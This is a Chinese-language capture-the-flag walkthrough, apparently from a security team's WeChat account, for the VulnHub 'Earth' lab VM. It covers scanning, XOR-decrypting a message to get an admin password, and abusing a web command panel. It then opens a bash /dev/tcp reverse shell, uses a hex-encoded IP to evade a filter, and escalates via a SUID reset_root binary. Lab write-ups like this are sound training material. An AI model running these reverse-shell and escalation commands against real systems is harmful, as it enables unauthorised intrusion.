> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rHcYbC1JLBRavMF_eyHYgA)

![图片](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXu3bXekvbOVFvAicpfFJwIOcQOuakZ6jTmyNoeraLFgI4cibKrDRiaPAljUry4dy4e2zK8lUMyKfkGg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**描述**

难度：简单

靶机上有两个flag：一个用户flag和一个包含 md5 哈希的root_flag。

  

===

**环境准备**
========

靶机获取地址：

https://www.vulnhub.com/entry/the-planets-earth,755/

将下载好的靶机导入虚拟机

拓扑如下：

![图片](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUZusvZRGXUrWwaZ4Kqw795pKPUzuUa8RLYSIzbOnXib6vP7ViasfNEvXnnMWNCM3sIfejBqicNrMJdw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**信息收集**
========

获取IP地址
------

根据拓扑当前我们仅知道目标机与攻击机处于同一网段下，但未知目标机ip，我们先使用二层探测目标机地址。获取到目标机ip地址为192.168.183.131，如下图所示。

```


netdiscover   //二层主机探测  
arp-scan -l


```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUZusvZRGXUrWwaZ4Kqw795jE7HVfx0aVob7CekhaqrYHAsOhnG0icNYo5IW7pzu6HKDlM5Q4a6KzA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

获取开放服务
------

对系统开放的服务进行探测,发现目标机开放了如下图所示服务。

```


nmap -A -p 1-65535 192.168.183.131


```

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUZusvZRGXUrWwaZ4Kqw795yZPBTzQibbicmVU7OmfV9NoKD4sLRlEomPurNgh29pGVz1oNcbmJ8hJQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

访问web服务，页面报错如下图所示400错误

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

设置本地hosts文件DNS解析earth.local和terratest.earth.local

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**收集earth.local信息**
-------------------

1.  访问earth.local获取到 Previous Messages:  
    
      
    

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```


37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40  
3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45  
2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a


```

  

2.  使用dirb扫描http://earth.local/和http:s//earth.local/的目录
    

```


dirb http://earth.local  
dirb https://earth.local


```

  

发现存在如下图所示目录

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

http://earth.local/admin

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

http://earth.local/cgi-bin

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**收集terratest.earth.local信息**
-----------------------------

1.  访问地址发现同earth.local相同页面
    
      
    

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

2.  使用dirb扫描http://terratest.earth.local和https://terratest.earth.local的目录
    

```


dirb http://terratest.earth.local  
dirb https://terratest.earth.local


```

发现如下图所示目录，其中在https://terratest.earth.local中发现robots.txt文件

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

3.  获取testingnotes.txt提示信息
    

查看robots，在其中发现testingnotes.*

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```


import requests  
  
url="https://terratest.earth.local/testingnotes"  
  
hz=[".asp", ".aspx", ".bat", ".c", ".cfm", ".cgi", ".com", ".dll", ".exe", ".htm", ".html", ".inc", ".jhtml",".jsa", ".json", ".jsp", ".log", ".mdb", ".nsf", ".php", ".phtml", ".pl", ".reg", ".sh", ".sql", ".txt",".xml"]  
  
for i in hz:  
      
    payload=url+i  
      
    res=requests.get(payload,verify=False)  
      
    if res.status_code==200:  
        print(payload+" exists")  



```

  

尝试robots中的后缀，遍历出testingnotes为txt文件，访问

https://terratest.earth.local/testingnotes.txt获得如下信息。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```


测试安全消息传递系统注意事项:    
*使用XOR加密作为算法，应该是安全的使用RSA。  
*地球已经确认他们收到了我们发送的信息。  
使用*testdata.txt测试加密。  
*terra用作管理门户的用户名。  
待办事项:    
*我们如何安全地将每月的钥匙发送到地球? 或者我们应该每周更换钥匙?    
*需要测试不同的密钥长度，以防止暴力。钥匙应该有多长?    
*需要改进消息界面和管理面板的界面，目前这是非常基本的。


```

  

*   使用的加密算法为XOR
    
*   testdata.txt是测试加密文件
    
*   用户名terra
    
      
    

4.  获取testdata.txt
    
      
    

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```


According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.


```

**漏洞利用**
========

秘钥破解
----

在收集的http://earth.local主页信息中给出了三条Previous Messages字符串，经过对比最下面一条字符串位数与testdata.txt文本转化为16进制后位数一致。使用Python进行异或解密如下：

```


import binascii  
data1 = "2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a"  
f = binascii.b2a_hex(open('testdata.txt', 'rb').read()).decode()  
a = hex(int(data1,16) ^ int(f,16))  
print(a)  
al = []  
for i in range(2, len(a), 2):  
    b = a[i:i+2]  
    b = int(b, 16)  
    c = chr(b)  
    print(c,end='')


```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

解密后的结果为

“earthclimatechangebad4humans”字符串的重复排列。

**登录后台**
--------

在testingnotes.txt中已知用户名：terra，密码为解密后的结果：

earthclimatechangebad4humans，尝试登录后台

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

登录后台后，发现命令执行功能，直接搜索flag

`find / -name "*flag*"`

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

查看flag：

[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**提权**
======

  

===

反弹shell
=======

1.  kali监听1234
    

`nc -lvp 1234`

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

2.  靶机
    

`bash -i >& /dev/tcp/192.168.183.128/1234 0>&1`

发现远程连接无响应尝试ip转换后连接

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

转换ip为十六进制连接连接成功，查看权限为apache

  

`bash -i >& /dev/tcp/0xc0.0xa8.0xb7.0x81/1234 0>&1`

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

查找权限命令
------

查找有权限的命令：

`find / -perm -u=s -type f 2>/dev/null`

发现/usr/bin/reset_root

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

尝试执行发现报错

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```


检查复位触发器是否存在…    
复位失败，所有触发器不存在。


```

**ltrace调试**
------------

使用`ltrace /usr/bin/reset_root`尝试找错，发现本地没有ltrace命令

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

使用nc传送到本地进行调试

`nc -nlvp 9999 >reset_root`

`nc -w 192.168.183.129 9999 < /usr/bin/reset_root`

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

报错如下，发现没有权限，赋权限777进行后发现缺少三个目录

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在靶机创建缺少的文件

`touch /dev/shm/kHgTFI5G`

`touch /dev/shm/Zw7bV9U5`

`touch /tmp/kcM0Wewe`

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**获得权限查找flag**  

-----------------

  

再次运行，reset_root获得密码

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

切换到root权限下查找flag

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

发现

/root/root_flag.txt

/var/earth_web/user_flag.txt

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

查看flag

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

E

N

D

  

  

**关**

**于**

**我**

**们**

Tide安全团队正式成立于2019年1月，是新潮信息旗下以互联网攻防技术研究为目标的安全团队，团队致力于分享高质量原创文章、开源安全工具、交流安全技术，研究方向覆盖网络攻防、系统安全、Web安全、移动终端、安全开发、物联网/工控安全/AI安全等多个领域。

团队作为“省级等保关键技术实验室”先后与哈工大、齐鲁银行、聊城大学、交通学院等多个高校名企建立联合技术实验室。团队公众号自创建以来，共发布原创文章370余篇，自研平台达到26个，目有15个平台已开源。此外积极参加各类线上、线下CTF比赛并取得了优异的成绩。如有对安全行业感兴趣的小伙伴可以踊跃加入或关注我们。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)